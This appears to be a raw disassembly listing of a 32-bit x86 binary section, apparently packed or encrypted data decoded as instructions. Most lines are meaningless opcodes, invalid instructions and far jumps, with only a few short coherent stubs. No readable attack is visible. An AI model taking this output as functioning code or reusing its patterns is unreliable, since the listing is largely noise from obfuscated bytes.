  40913a:	or     eax,0x55e8d671
  40913f:	loop   0x4090f7
  409141:	imul   esp,DWORD PTR [edx+0x49],0xffffffc4
  409145:	bswap  eax
  409147:	mov    ds:0x76a1593b,eax
  40914c:	setb   BYTE PTR [ebx+ebx*8+0x6c]
  409151:	mov    DWORD PTR [ebp+esi*4+0x1b03a7ee],ebp
  409158:	dec    edx
  409159:	jg     0x409112
  40915b:	add    BYTE PTR [esi+eax*2+0x34],ch
  40915f:	mov    ebp,0x8e08df92
  409164:	popf   
  409165:	retf   
  409166:	cmp    eax,0xd9a39bfa
  40916b:	in     al,dx
  40916c:	jb     0x40914b
  40916e:	jne    0x409153
  409170:	adc    al,0xde
  409172:	ret    
  409173:	push   ebp
  409174:	ins    DWORD PTR es:[edi],dx
  409175:	daa    
  409176:	push   es
  409177:	test   DWORD PTR [ecx-0x56],0x4007265b
  40917e:	xor    ecx,DWORD PTR [ecx]
  409180:	push   ds
  409181:	jb     0x409157
  409183:	mov    al,0x7e
  409185:	xchg   DWORD PTR [edx-0x66aa6592],esi
  40918b:	sbb    DWORD PTR [ecx-0x1e],0x50529876
  409192:	sti    
  409193:	in     al,0xf7
  409195:	mov    esi,0x18a7f8a0
  40919a:	mov    al,ds:0xf89831a1
  40919f:	adc    ebx,DWORD PTR [ebp+0x5347bf4c]
  4091a5:	sub    BYTE PTR cs:[ecx-0x73],bl
  4091a9:	sti    
  4091aa:	addr16 ret 0x21f5
  4091ae:	hlt    
  4091af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091b0:	jge    0x409207
  4091b2:	mov    bh,BYTE PTR [eax+0x70ac8d06]
  4091b8:	xchg   ebp,eax
  4091b9:	test   ecx,esp
  4091bb:	xchg   esp,eax
  4091bc:	outs   dx,DWORD PTR ds:[esi]
  4091bd:	sub    DWORD PTR ds:0x54081a85,0x61b87515
  4091c7:	mov    al,ds:0xaaca6edc
  4091cc:	retf   
  4091cd:	xor    dl,BYTE PTR [ebp-0x2c]
  4091d0:	hlt    
  4091d1:	push   ebx
  4091d2:	int    0x24
  4091d4:	mov    eax,ds:0x1fa8fd5
  4091d9:	test   BYTE PTR [edx-0x630f4290],0x2b
  4091e0:	shr    DWORD PTR [ebx],cl
  4091e2:	(bad)  
  4091e3:	in     eax,0x3e
  4091e5:	call   0x136b1978
  4091ea:	jle    0x409239
  4091ec:	stos   BYTE PTR es:[edi],al
  4091ed:	aas    
  4091ee:	jge    0x409203
  4091f0:	cli    
  4091f1:	cli    
  4091f2:	ror    al,1
  4091f4:	cmp    BYTE PTR [eax+0x755497f2],dh
  4091fa:	or     ecx,DWORD PTR [eax+0x2e]
  4091fd:	xchg   ebx,eax
  4091fe:	fst    QWORD PTR [esi+0x3c]
  409201:	sar    BYTE PTR [ecx+edx*1+0x449aa800],1
  409208:	aaa    
  409209:	jecxz  0x409232
  40920b:	shl    ecx,1
  40920d:	or     al,0x78
  40920f:	sub    cl,bh
  409211:	ins    BYTE PTR es:[edi],dx
  409212:	add    DWORD PTR [edx],edx
  409214:	mov    ds:0x9ee541d1,al
  409219:	and    DWORD PTR [edx+0x2ace241a],edi
  40921f:	test   BYTE PTR [ebx],ah
  409221:	mov    BYTE PTR [ecx+eax*8+0x2],dl
  409225:	lds    esi,FWORD PTR [edi+0xf]
  409228:	mov    edi,0xaf737b7c
  40922d:	je     0x409271
  40922f:	test   bl,bl
  409231:	pop    edi
  409232:	push   ebx
  409233:	loopne 0x409250
  409235:	das    
  409236:	fadd   DWORD PTR [ebx+0x5de8a194]
  40923c:	jmp    0x4c37:0xafab5d71
  409243:	ins    DWORD PTR es:[edi],dx
  409244:	or     ch,ch
  409246:	sub    BYTE PTR [edx],ch
  409248:	add    BYTE PTR [edx-0x42],ah
  40924b:	or     eax,0xf44507fe
  409250:	test   eax,0xbc76e34f
  409255:	push   esi
  409256:	inc    esi
  409257:	jns    0x4092b2
  409259:	hlt    
  40925a:	(bad)  
  40925b:	nop
  40925c:	dec    esp
  40925d:	arpl   dx,bx
  40925f:	jb     0x4091ea
  409261:	xchg   edx,esp
  409263:	pop    esp
  409264:	mov    cl,0x25
  409266:	dec    edi
  409267:	stos   DWORD PTR es:[edi],eax
  409268:	call   0xb7d6:0xb7995cdc
  40926f:	push   cs
  409270:	jo     0x4091f6
  409272:	adc    eax,0xbdad5091
  409277:	xor    eax,0x1839e899
  40927c:	jmp    0x98aa0b1e
  409281:	(bad)  
  409282:	std    
  409283:	jmp    0xf3501482
  409288:	fstp   st(6)
  40928a:	xor    al,0x34
  40928c:	aam    0xf6
  40928e:	mov    edi,0x29d9eef0
  409293:	test   eax,0x37d32aa8
  409298:	stos   BYTE PTR es:[edi],al
  409299:	cmp    al,BYTE PTR [eax]
  40929b:	sbb    dh,cl
  40929d:	jae    0x4092d9
  40929f:	out    0x8f,al
  4092a1:	jp     0x40926b
  4092a3:	mov    esi,0xc8e40552
  4092a8:	clc    
  4092a9:	lahf   
  4092aa:	cmp    al,0xea
  4092ac:	loopne 0x4092fa
  4092ae:	mov    al,0x31
  4092b0:	add    ah,bl
  4092b2:	cs fwait
  4092b4:	ror    edx,1
  4092b6:	dec    edx
  4092b8:	push   ecx
  4092b9:	or     eax,0x3155288d
  4092be:	mov    ch,BYTE PTR [ecx+eiz*8-0x3cd18b69]
  4092c5:	sbb    DWORD PTR [esi+eiz*1+0x34f52a28],0xfffffff1
  4092cd:	sub    esi,edx
  4092cf:	mov    ecx,0x7bcf4138
  4092d4:	hlt    
  4092d5:	cmp    DWORD PTR [ecx-0x63],eax
  4092d8:	popf   
  4092d9:	out    0xba,eax
  4092db:	push   esi
  4092dc:	and    al,0xc3
  4092de:	sbb    ch,BYTE PTR [esi]
  4092e0:	ret    
  4092e1:	ins    DWORD PTR es:[edi],dx
  4092e2:	mov    edi,0x491bb25f
  4092e7:	in     al,dx
  4092e8:	loope  0x409324
  4092ea:	popa   
  4092eb:	pop    ecx
  4092ec:	ds mov esi,0xfee4a0b8
  4092f2:	leave  
  4092f3:	cli    
  4092f4:	adc    eax,0xb8c53db2
  4092f9:	cs retf 0x63a1
  4092fd:	je     0x409369
  4092ff:	jp     0x4092c0
  409301:	push   DWORD PTR [eax]
  409303:	lea    eax,ds:0x41b260
  409309:	push   DWORD PTR [eax]
  40930b:	lea    eax,ds:0x41b344
  409311:	push   DWORD PTR [eax]
  409313:	xchg   ebx,edx
  409315:	inc    ebx
  409316:	inc    ebx
  409317:	sub    ebx,0x3
  40931a:	push   ebx
  40931b:	pop    eax
  40931c:	jmp    0x409669
  409321:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409322:	jnp    0x409329
  409324:	or     DWORD PTR [ecx+0x52b3b211],esp
  40932a:	lahf   
  40932b:	jo     0x4092ae
  40932d:	xor    al,0xa6
  40932f:	mov    edi,0x70e22754
  409334:	jo     0x409356
  409336:	jge    0x4093a8
  409338:	jo     0x40936e
  40933a:	nop
  40933b:	pusha  
  40933c:	bound  eax,QWORD PTR [edi+0x73]
  40933f:	icebp  
  409340:	pop    edi
  409341:	ds jg  0x409394
  409344:	cmc    
  409345:	es inc esp
  409347:	mov    ah,bl
  409349:	xor    al,0xc3
  40934b:	inc    ebx
  40934c:	mov    ecx,0x62119e5d
  409351:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409352:	imul   ebp,ebx,0xffffffef
  409355:	dec    edi
  409356:	add    BYTE PTR [ecx+0x33e4e464],ah
  40935c:	push   ebx
  40935d:	cwde   
  40935e:	in     eax,0x5f
  409360:	loope  0x409359
  409362:	add    BYTE PTR [ebx+0x452475e7],bh
  409368:	jl     0x409379
  40936a:	dec    edx
  40936b:	(bad)  
  40936c:	cmp    eax,edx
  40936e:	mov    dx,WORD PTR [ebx-0x72]
  409372:	or     al,0xc4
  409374:	adc    eax,0x64a1297d
  409379:	pusha  
  40937a:	popa   
  40937b:	cmp    DWORD PTR [esi],eax
  40937d:	dec    ecx
  40937e:	mov    esp,0x1f55795c
  409383:	fst    DWORD PTR [eax-0x28a5627f]
  409389:	sbb    BYTE PTR [edx],al
  40938b:	ret    0xfd7d
  40938e:	sbb    BYTE PTR [ebx-0x20],dl
  409391:	cmp    ebp,esi
  409393:	push   edi
  409394:	test   BYTE PTR [ecx+0x6ca968a9],bh
  40939a:	fcmovu st,st(0)
  40939c:	sti    
  40939d:	(bad)  
  40939e:	(bad)  
  40939f:	push   edx
  4093a0:	pop    edi
  4093a1:	arpl   WORD PTR [ecx+0x777282e8],cx
  4093a7:	xor    BYTE PTR [ecx],dl
  4093a9:	mov    bh,0x87
  4093ab:	push   0x2c
  4093ad:	call   0x4d6:0xef52a1e2
  4093b4:	or     ebx,edx
  4093b6:	(bad)  
  4093b7:	pushf  
  4093b8:	pop    ds
  4093b9:	xchg   edi,eax
  4093ba:	dec    ebp
  4093bb:	cmp    ecx,DWORD PTR [edi+0x1e911650]
  4093c1:	enter  0x4fa8,0x68
  4093c5:	jmp    0xcec7e42b
  4093ca:	imul   edx,DWORD PTR [edx],0xffffff83
  4093cd:	(bad)  
  4093ce:	or     al,0x3c
  4093d0:	lea    ebp,[ebx-0x215816e1]
  4093d6:	adc    al,0x9b
  4093d8:	mov    bh,0x9f
  4093da:	xor    al,0x52
  4093dc:	mov    WORD PTR [edi-0x2c0b55b2],fs
  4093e2:	das    
  4093e3:	dec    eax
  4093e4:	lahf   
  4093e5:	fnstsw WORD PTR [eax+0x64]
  4093e8:	(bad)  
  4093e9:	mov    edx,esp
  4093eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4093ec:	mov    bl,0xea
  4093ee:	popf   
  4093ef:	add    BYTE PTR [esi+0x5d41e235],ch
  4093f5:	mov    edx,0xc2895a4d
  4093fa:	jge    0x4093a4
  4093fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093fd:	call   0x61e6:0xc936e6
  409404:	jne    0x409394
  409406:	mov    fs,WORD PTR [edx+0x6b]
  409409:	push   es
  40940a:	fnsave ds:0x3d34d2c
  409410:	inc    ecx
  409411:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409412:	adc    BYTE PTR [edx-0x48003df7],cl
  409418:	enter  0x42b0,0xa0
  40941c:	lahf   
  40941d:	repz shl DWORD PTR [esi+0xe],cl
  409421:	(bad)  
  409422:	cmp    al,0xe4
  409424:	jg     0x4093fa
  409426:	xlat   BYTE PTR ds:[ebx]
  409427:	pusha  
  409428:	jb     0x409402
  40942a:	and    al,0x36
  40942c:	fmul   QWORD PTR [eax-0x785faf2e]
  409432:	jg     0x409416
  409434:	(bad)
  409437:	outs   dx,DWORD PTR ds:[esi]
  409438:	pop    edx
  409439:	cs addr16 inc edi
  40943c:	push   edx
  40943d:	hlt    
  40943e:	cdq    
  40943f:	mov    ebp,0x1e2f3c41
  409444:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409445:	push   edx
  409446:	push   cs
  409447:	xor    edi,DWORD PTR [edi]
  409449:	(bad)  
  40944b:	cwde   
  40944c:	sub    al,0x13
  40944e:	mov    ah,BYTE PTR [edx-0x56304c7b]
  409454:	fmul   QWORD PTR [edi]
  409456:	in     al,0x11
  409458:	xchg   edi,eax
  409459:	cld    
  40945a:	cmp    BYTE PTR [ecx],bh
  40945c:	mov    al,ds:0xccda4fdd
  409461:	test   eax,0xf8da7792
  409466:	xor    edx,DWORD PTR [ecx-0x35]
  409469:	sbb    al,BYTE PTR [esi+ebp*8+0x43]
  40946d:	out    dx,eax
  40946e:	lahf   
  40946f:	lods   eax,DWORD PTR ds:[esi]
  409470:	mov    di,0xee19
  409474:	jge    0x4094c1
  409476:	mov    ch,0x56
  409478:	in     eax,0x3d
  40947a:	mov    eax,0x57df206
  40947f:	mov    ah,BYTE PTR [edx+ebp*4+0x6d]
  409483:	jbe    0x40941c
  409485:	jae    0x409425
  409487:	clc    
  409488:	and    bl,BYTE PTR [esi-0x44]
  40948b:	dec    ecx
  40948c:	mov    al,cl
  40948e:	jl     0x409498
  409490:	adc    al,BYTE PTR [edi+0x31]
  409493:	xchg   ecx,eax
  409494:	aad    0x9f
  409496:	gs nop
  409498:	push   edi
  409499:	scas   eax,DWORD PTR es:[edi]
  40949a:	cmp    al,0xa3
  40949c:	and    eax,0x28accced
  4094a1:	sub    eax,0xc2e2c9b
  4094a6:	inc    edx
  4094a7:	jo     0x409522
  4094a9:	jmp    0x1cc3b0d9
  4094ae:	out    dx,al
  4094af:	sub    BYTE PTR [ecx+edi*1],ah
  4094b2:	fwait
  4094b3:	push   es
  4094b4:	inc    DWORD PTR [eax]
  4094b6:	(bad)  
  4094b7:	push   esp
  4094b8:	xchg   ecx,eax
  4094b9:	cs aam 0xd8
  4094bc:	dec    edi
  4094bd:	scas   al,BYTE PTR es:[edi]
  4094be:	push   ebp
  4094bf:	dec    esi
  4094c0:	cmp    al,0xfd
  4094c2:	test   BYTE PTR [esi-0x62],0x90
  4094c6:	dec    edx
  4094c7:	pop    ecx
  4094c8:	or     BYTE PTR [edi+eiz*1+0x4d705d1e],ch
  4094cf:	inc    edi
  4094d0:	scas   eax,DWORD PTR es:[edi]
  4094d1:	pop    ds
  4094d2:	xor    al,0x5b
  4094d4:	push   es
  4094d5:	fld    QWORD PTR [ecx]
  4094d7:	mov    ebp,0x34dc6e74
  4094dc:	jg     0x4094be
  4094de:	mov    WORD PTR [ebx-0x3bd401e6],?
  4094e4:	repz push 0xa0faa54
  4094ea:	pop    edi
  4094eb:	mov    eax,0xcd0c1956
  4094f0:	jecxz  0x40949a
  4094f2:	sub    al,0x19
  4094f4:	jmp    0xfad8ff5f
  4094f9:	gs (bad) 
  4094fb:	stos   DWORD PTR es:[edi],eax
  4094fc:	adc    BYTE PTR [esi-0x4fa4d49f],bl
  409502:	or     eax,ebp
  409504:	xchg   BYTE PTR [eax-0x53],dl
  409507:	mov    eax,cs
  409509:	js     0x4094e9
  40950b:	jne    0x409502
  40950d:	sar    edx,0x47
  409510:	test   eax,0x66b1a3e6
  409515:	jl     0x409580
  409517:	dec    ebp
  409518:	pop    es
  409519:	xor    ah,bl
  40951b:	outs   dx,BYTE PTR ds:[esi]
  40951c:	shl    DWORD PTR [ecx-0x48],1
  40951f:	and    BYTE PTR [eax+0x56],cl
  409522:	dec    edi
  409523:	pop    edx
  409524:	mov    eax,fs:0x5bc91f8f
  40952a:	ins    BYTE PTR es:[edi],dx
  40952b:	mov    ds:0x45d71cd5,al
  409530:	scas   al,BYTE PTR es:[edi]
  409531:	and    ecx,edi
  409533:	ds pop ebx
  409535:	xchg   ebp,eax
  409536:	pop    ecx
  409537:	mov    al,ds:0x501886f1
  40953c:	sbb    eax,0xa52b413a
  409541:	rol    BYTE PTR [edi+0x21],0x9d
  409545:	dec    esp
  409546:	dec    esi
  409547:	pop    edx
  409548:	pop    ds
  409549:	push   ss
  40954a:	cs cmc 
  40954c:	lock ret 
  40954e:	and    ebx,DWORD PTR [ebp-0x1b]
  409551:	fisttp QWORD PTR [esi]
  409553:	std    
  409554:	jge    0x4095ce
  409556:	mov    eax,0xcada25d2
  40955b:	test   ch,dh
  40955d:	ds jns 0x409536
  409560:	push   ecx
  409561:	jp     0x409532
  409563:	(bad)  [edi]
  409565:	retf   
  409566:	jp     0x40957b
  409568:	mov    ?,ebx
  40956a:	mul    BYTE PTR [eax-0x3674186e]
  409570:	xchg   esi,eax
  409571:	repnz inc esp
  409573:	call   0x22c0:0x61d8f0c0
  40957a:	jno    0x40955d
  40957c:	imul   edi,DWORD PTR [ecx-0x4a557b15],0x7ca9d20e
  409586:	xor    DWORD PTR [edi-0xf],ecx
  409589:	xchg   BYTE PTR [edx],bh
  40958b:	mov    cs,WORD PTR [eax+0x33]
  40958e:	lahf   
  40958f:	ret    
  409590:	aas    
  409591:	pop    eax
  409592:	inc    edx
  409593:	test   eax,0x4c3664a0
  409598:	xlat   BYTE PTR ds:[ebx]
  409599:	mov    al,0x57
  40959b:	ret    0xe4b
  40959e:	and    al,0x51
  4095a0:	push   edx
  4095a1:	push   ds
  4095a2:	out    0x18,al
  4095a4:	sbb    BYTE PTR [ecx],0x4f
  4095a7:	fs int3 
  4095a9:	aaa    
  4095aa:	inc    eax
  4095ab:	hlt    
  4095ac:	and    BYTE PTR [eax],dl
  4095ae:	mov    ebp,0x3f3a95a2
  4095b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095b4:	aas    
  4095b5:	mov    ebp,0xa491ae36
  4095ba:	ja     0x4095f8
  4095bc:	mov    ds:0x4d876eed,eax
  4095c1:	dec    ebx
  4095c2:	jmp    0x73e36d1c
  4095c7:	cmc    
  4095c8:	dec    esi
  4095c9:	sbb    BYTE PTR [eax+0x778b3652],bl
  4095cf:	mov    ds:0xf9e8e3b4,eax
  4095d4:	and    DWORD PTR fs:[eax-0x4d547c36],eax
  4095db:	jmp    DWORD PTR [ecx+edx*2+0x2ade9b57]
  4095e2:	ret    0x2879
  4095e5:	pop    ds
  4095e6:	mov    ebp,0x73d0acd2
  4095eb:	xor    al,0x56
  4095ed:	loope  0x4095a6
  4095ef:	and    DWORD PTR [esp+ecx*1],edx
  4095f2:	mov    esp,0xecc2c053
  4095f7:	jmp    0x409651
  4095f9:	xchg   edi,eax
  4095fa:	mov    al,0xef
  4095fc:	test   eax,0x6d36bef9
  409601:	aam    0x6
  409603:	pop    ebx
  409604:	inc    ebp
  409605:	and    ebx,ebp
  409607:	push   edx
  409608:	push   es
  409609:	popf   
  40960a:	test   ebp,edx
  40960c:	bsf    esi,DWORD PTR [ecx-0x4a]
  409610:	cmp    DWORD PTR [edx-0x2e23058d],esi
  409616:	mov    bl,0x7
  409618:	mov    BYTE PTR [ebp-0x39c3fa67],bh
  40961e:	push   ds
  40961f:	push   cs
  409620:	fld    TBYTE PTR [edi-0x4aecc111]
  409626:	shl    BYTE PTR [ebp+eax*1+0x9bb8672],1
  40962d:	je     0x4095b3
  40962f:	mov    eax,0x56d6eab4
  409634:	call   0xcc5c:0x82a940d5
  40963b:	xchg   ecx,eax
  40963c:	jnp    0x4095d3
  40963e:	in     al,dx
  40963f:	jle    0x40968f
  409641:	add    bh,BYTE PTR [edx-0x4f]
  409644:	scas   eax,DWORD PTR es:[edi]
  409645:	push   ebp
  409646:	out    dx,al
  409647:	mov    WORD PTR [edi-0x13c7249a],cs
  40964d:	(bad)  
  40964f:	mov    esi,DWORD PTR [eax]
  409651:	or     al,0xdd
  409653:	add    al,cl
  409655:	add    DWORD PTR [esi],esp
  409657:	retf   0xae78
  40965a:	cmc    
  40965b:	neg    BYTE PTR [eax+ebx*2]
  40965e:	aaa    
  40965f:	adc    eax,0x14feb6ef
  409664:	push   cs
  409665:	sbb    DWORD PTR [eax+eiz*1+0x150ff98],esp
  40966c:	mov    eax,DWORD PTR [ebp-0x20]
  40966f:	mov    ecx,DWORD PTR ds:0x41b224
  409675:	jmp    0x4099c2
  40967a:	out    dx,eax
  40967b:	mov    ebx,0xd169d149
  409680:	ja     0x4096e3
  409682:	add    BYTE PTR [edi+0x44],bh
  409685:	xchg   DWORD PTR [edx],esp
  409687:	repz sub ch,BYTE PTR [edi+0x7070efd7]
  40968e:	and    BYTE PTR [ebp+0x70],bh
  409691:	jo     0x4096fb
  409693:	and    BYTE PTR [ebx+0x44b50761],ch
  409699:	enter  0x1b26,0x2
  40969d:	inc    eax
  40969e:	adc    ebp,DWORD PTR [ebx-0x16224888]
  4096a4:	dec    ebx
  4096a5:	mov    esi,DWORD PTR [ebp-0x5c395fcd]
  4096ab:	imul   eax,DWORD PTR [edx+0x732f7e29],0x90c2f1d4
  4096b5:	data16 int3 
  4096b7:	jmp    0x409664
  4096b9:	xor    dh,BYTE PTR [eax-0x4]
  4096bc:	cli    
  4096bd:	fdivr  DWORD PTR [eax-0x1a]
  4096c0:	out    0xa3,eax
  4096c2:	jl     0x409666
  4096c4:	xchg   ecx,eax
  4096c5:	(bad)
  4096c9:	xor    eax,0x796fb398
  4096ce:	call   0x126d:0x10d6e6dd
  4096d5:	xor    eax,0x5f88dbc9
  4096da:	std    
  4096db:	jmp    0x2259e5a1
  4096e0:	fnstsw WORD PTR [esi-0x6e]
  4096e3:	arpl   WORD PTR [esp+esi*2+0x43],di
  4096e7:	retf   
  4096e8:	sar    DWORD PTR [edx],0xbd
  4096eb:	icebp  
  4096ec:	xchg   esi,eax
  4096ed:	mov    edi,eax
  4096ef:	mov    eax,0x4e681fae
  4096f4:	lods   al,BYTE PTR ds:[esi]
  4096f5:	or     cl,BYTE PTR [edi]
  4096f7:	sub    DWORD PTR [ecx-0x6d],0x8e57dced
  4096fe:	lea    ebx,[ecx-0x7dd6872e]
  409704:	test   ebp,0x69872368
  40970a:	push   ecx
  40970b:	sub    ecx,edx
  40970d:	call   0xa5be9bf5
  409712:	sbb    bl,BYTE PTR [ebx+0x52]
  409715:	ret    
  409716:	inc    ecx
  409717:	xchg   edx,eax
  409718:	test   eax,0x2abbb374
  40971d:	repz mov eax,ds:0x293f0a06
  409723:	scas   eax,DWORD PTR es:[edi]
  409724:	xor    DWORD PTR [eax],0xffffffe0
  409727:	jl     0x4096cb
  409729:	and    DWORD PTR [edi-0x1dc7c8d8],0xbf05016d
  409733:	test   edx,edx
  409735:	add    eax,0xaa98341f
  40973a:	push   edi
  40973b:	loop   0x409740
  40973d:	and    BYTE PTR [esi+0x1a],al
  409740:	xor    esi,DWORD PTR [ecx-0x476eacfe]
  409746:	into   
  409747:	icebp  
  409748:	mov    bh,al
  40974a:	sub    DWORD PTR [edi+0x23],0x411823bb
  409751:	pop    ss
  409752:	adc    ebp,DWORD PTR [ebp+0x7bc8a238]
  409758:	adc    bh,cl
  40975a:	std    
  40975b:	daa    
  40975c:	mov    edi,0xdcfafec5
  409761:	out    0xc0,eax
  409763:	add    dl,ch
  409765:	jnp    0x409791
  409767:	push   ebp
  409768:	mov    eax,ds:0xa4d2202c
  40976d:	mov    eax,0xd5126729
  409772:	aas    
  409773:	sub    al,0x27
  409775:	sbb    ch,BYTE PTR [ebp+eiz*8-0x36]
  409779:	fistp  DWORD PTR [ecx+0x25d4787d]
  40977f:	scas   al,BYTE PTR es:[edi]
  409780:	mov    ebx,0x7e52fcbf
  409785:	aad    0x89
  409787:	mov    al,0xc5
  409789:	adc    eax,0xc27cbcc0
  40978e:	jg     0x40975e
  409790:	lods   eax,DWORD PTR ds:[esi]
  409791:	inc    edi
  409792:	test   eax,0xbb518da3
  409797:	ins    BYTE PTR es:[edi],dx
  409798:	xchg   edi,eax
  409799:	int    0xfd
  40979b:	retf   0xddce
  40979e:	cmp    al,BYTE PTR [ebx+0x42]
  4097a1:	adc    al,0xcd
  4097a3:	fild   WORD PTR [eax]
  4097a5:	jp     0x409784
  4097a7:	iret   
  4097a8:	int    0xcd
  4097aa:	pop    ebx
  4097ab:	sbb    al,0x5c
  4097ad:	or     DWORD PTR [ecx],edx
  4097af:	xchg   esi,eax
  4097b0:	mov    bh,0xde
  4097b2:	adc    bh,bl
  4097b4:	pusha  
  4097b5:	cmp    al,0x4e
  4097b7:	(bad)  
  4097b9:	mov    bh,dl
  4097bb:	mov    ebx,0xbc68d96e
  4097c0:	fwait
  4097c1:	pop    es
  4097c2:	xchg   ebp,eax
  4097c3:	mov    edi,0x73895c6a
  4097c8:	ficomp WORD PTR gs:[ecx]
  4097cb:	sub    dh,BYTE PTR [edi-0x56]
  4097ce:	sub    ecx,DWORD PTR [ebx]
  4097d0:	adc    eax,DWORD PTR [edi]
  4097d2:	xor    edx,ebp
  4097d4:	cld    
  4097d5:	fidivr WORD PTR [esi]
  4097d7:	clc    
  4097d8:	popa   
  4097d9:	cmp    ebp,0xefd77e85
  4097df:	pop    edx
  4097e0:	and    DWORD PTR [ebx],ecx
  4097e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4097e3:	mov    ecx,DWORD PTR [esp+edi*8-0x2c4eabef]
  4097ea:	xchg   edx,eax
  4097eb:	neg    BYTE PTR [eax+0x2d]
  4097ee:	add    esi,DWORD PTR [edx+eiz*8-0x3de02026]
  4097f5:	sbb    BYTE PTR [esi],0x12
  4097f8:	out    dx,eax
  4097f9:	xlat   BYTE PTR ds:[ebx]
  4097fa:	stc    
  4097fb:	into   
  4097fc:	in     eax,dx
  4097fd:	loopne 0x409808
  4097ff:	mov    ebx,0x9cb79817
  409804:	shl    BYTE PTR [ebx+eax*1-0x6e],1
  409808:	and    al,0x16
  40980a:	xor    cl,BYTE PTR [edx-0xc21bf95]
  409810:	push   esi
  409811:	mov    al,0x6a
  409813:	jge    0x409803
  409815:	aas    
  409816:	xchg   DWORD PTR [esi-0x3b],ebx
  409819:	xchg   ebx,eax
  40981a:	or     al,0xcd
  40981c:	mov    edi,0xb3ccdd79
  409821:	adc    DWORD PTR [eax+ebx*2-0x56e64b90],0x23c5be32
  40982c:	inc    edx
  40982d:	xlat   BYTE PTR ds:[ebx]
  40982e:	or     al,0x17
  409830:	hlt    
  409831:	rcr    BYTE PTR ds:0x9f18075d,cl
  409837:	std    
  409838:	popf   
  409839:	or     eax,0x9793f48c
  40983e:	aam    0xe2
  409840:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409841:	and    DWORD PTR [ecx-0x6c86d95],0x2d
  409848:	sti    
  409849:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40984a:	(bad)  
  40984c:	call   FWORD PTR [eax-0x3a]
  40984f:	sbb    al,0x15
  409851:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409852:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409853:	retf   
  409854:	jge    0x4098d5
  409856:	xchg   ebp,eax
  409857:	mov    al,ds:0xc7caa554
  40985c:	xchg   ebx,eax
  40985d:	les    ebp,FWORD PTR [eax+0x7c]
  409860:	je     0x4098af
  409862:	cld    
  409863:	ss xchg bh,cl
  409866:	ja     0x409838
  409868:	and    ah,BYTE PTR [eax+ebp*1]
  40986b:	or     ebx,ebp
  40986d:	or     dh,0x5f
  409870:	mov    al,0x25
  409872:	or     al,BYTE PTR [edx]
  409874:	cmp    ah,BYTE PTR [ebx-0x5d5c2698]
  40987a:	dec    ebp
  40987b:	shl    BYTE PTR [edi-0x17],cl
  40987e:	inc    esi
  40987f:	test   al,0xfd
  409881:	mov    cs,WORD PTR ds:0x8fbe5a0a
  409887:	push   edi
  409888:	inc    esp
  409889:	outs   dx,BYTE PTR ds:[esi]
  40988a:	bound  ecx,QWORD PTR [esi]
  40988c:	(bad)  
  40988d:	test   al,0xce
  40988f:	push   edx
  409890:	clc    
  409891:	sub    ebp,DWORD PTR [esi-0x7f]
  409894:	push   edi
  409895:	repz mov al,ds:0xff3edcdb
  40989b:	inc    edi
  40989c:	xor    BYTE PTR [ebx-0x36],dh
  40989f:	mov    BYTE PTR [edx-0x5e8b5926],dh
  4098a5:	mov    ah,0x1c
  4098a7:	ins    DWORD PTR es:[edi],dx
  4098a8:	pop    esp
  4098a9:	daa    
  4098aa:	stos   DWORD PTR es:[edi],eax
  4098ab:	xchg   ecx,eax
  4098ac:	mov    ebx,0x5cd1c07e
  4098b1:	xor    DWORD PTR [edi-0xd7236d6],ecx
  4098b7:	dec    edi
  4098b8:	in     al,0xb0
  4098ba:	(bad)  
  4098bb:	or     ecx,DWORD PTR [edi]
  4098bd:	pop    edx
  4098be:	adc    DWORD PTR [ebp-0x39],eax
  4098c1:	jge    0x409919
  4098c3:	push   edi
  4098c4:	mov    ds,esi
  4098c6:	and    DWORD PTR [ebx+eax*8],0x46691a15
  4098cd:	into   
  4098ce:	jno    0x4098c2
  4098d0:	mov    ds:0xe3db3201,al
  4098d5:	popa   
  4098d6:	popa   
  4098d7:	fs or  eax,0x9ab4d6a0
  4098dd:	and    ah,BYTE PTR [esi+0x1d]
  4098e0:	(bad)  
  4098e2:	call   0xa3adf63d
  4098e7:	rcr    DWORD PTR [edx+0x3d],0xdf
  4098eb:	outs   dx,DWORD PTR ds:[esi]
  4098ec:	cli    
  4098ed:	in     eax,0x19
  4098ef:	sbb    bl,BYTE PTR [esp+ebp*1+0xc7c1a9b]
  4098f6:	(bad)  
  4098f7:	xchg   bx,ax
  4098f9:	out    dx,al
  4098fa:	mov    al,0x3a
  4098fc:	loopne 0x409890
  4098fe:	mov    edi,0x6a83ec55
  409903:	sahf   
  409904:	outs   dx,BYTE PTR ds:[esi]
  409905:	xor    dh,BYTE PTR [edi-0x29]
  409908:	into   
  409909:	sbb    eax,0xdf98c6f1
  40990e:	sbb    BYTE PTR [eax+0x54],dh
  409911:	mov    esp,0xe805b44c
  409916:	jns    0x40997c
  409918:	pop    ds
  409919:	or     BYTE PTR [edx-0x37],bl
  40991c:	in     eax,0x16
  40991e:	int    0x26
  409920:	es xor eax,0x696d5de5
  409926:	dec    edi
  409927:	add    al,BYTE PTR [edx-0x2566e3f5]
  40992d:	ror    DWORD PTR [eax+edx*8],cl
  409930:	jns    0x4098de
  409932:	rol    BYTE PTR [edx+edi*2-0x5f2236c6],1
  409939:	and    DWORD PTR [ebx-0x70],esp
  40993c:	cmp    eax,edi
  40993e:	pusha  
  40993f:	mov    al,0x9a
  409941:	cli    
  409942:	dec    edi
  409943:	test   DWORD PTR [eax-0x219cf665],esp
  409949:	xor    al,0xa5
  40994b:	arpl   WORD PTR [ecx],si
  40994d:	fdiv   QWORD PTR [ecx-0x3bb00e7d]
  409953:	adc    BYTE PTR [ebp+0x7676e7e1],bl
  409959:	outs   dx,BYTE PTR ds:[esi]
  40995a:	and    ecx,DWORD PTR [esi+0x7f30e015]
  409960:	cld    
  409961:	mov    edi,0x640c0507
  409966:	adc    eax,0xffffff8b
  409969:	push   es
  40996a:	ret    
